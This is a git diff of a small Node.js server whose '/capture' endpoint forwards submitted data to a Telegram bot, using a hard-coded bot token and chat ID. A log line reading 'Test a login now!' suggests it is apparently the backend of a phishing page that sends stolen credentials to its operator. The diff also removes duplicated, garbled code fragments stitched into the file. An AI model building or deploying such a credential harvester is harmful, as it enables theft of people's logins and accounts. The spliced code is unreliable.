@@ -5,6 +5,7 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// YOUR TELEGRAM DETAILS
 const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
 const CHAT_ID = "8725339154";
 
@@ -40,7 +41,7 @@ app.post('/capture', async (req, res) => {
                 parse_mode: "MarkdownV2"
             })
         });
-        console.log("✅ Sent to Telegram");
+        console.log("✅ Sent to Telegram successfully");
     } catch (err) {
         console.error("❌ Telegram error:", err.message);
     }
@@ -49,45 +50,5 @@ app.post('/capture', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "MarkdownV2"
-            })
-        });
-        console.log("✅ Sent to Telegram");
-    } catch (err) {
-        console.error("❌ Telegram error:", err.message);
-    }
-
-    res.json({ success: true });
-});
-
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "MarkdownV2"
-            })
-        });
-
-        if (response.ok) {
-            console.log("✅ Successfully sent to Telegram");
-        } else {
-            console.error(`❌ Telegram Error: ${response.status}`);
-        }
-    } catch (err) {
-        console.error("❌ Failed to send to Telegram:", err.message);
-    }
-
-    res.json({ success: true });
-});
-
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log("✅ Telegram bot is ready. Test a login now!");
+    console.log(`🚀 Server running on port ${PORT}`);
 });
